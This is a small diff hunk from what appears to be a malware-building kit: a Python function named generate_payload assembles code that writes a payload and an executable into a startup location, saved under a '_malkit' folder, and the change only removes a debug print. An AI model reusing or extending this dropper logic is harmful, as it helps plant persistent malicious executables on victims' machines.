@@ -96,7 +96,6 @@ def generate_payload(filename, destname, startup, icon="icons/icon.ico", modulen
     pyline += "    f.write(payload)\n"
     pyline += f"with open(STARTUP, 'wb') as f:\n"
     pyline += "    f.write(exepayload)"
-    print(len(pyline))
     with open(f"_malkit/{destname}.py", "wb") as f:
         f.write(pyline.encode())
     return f"{modulename}"
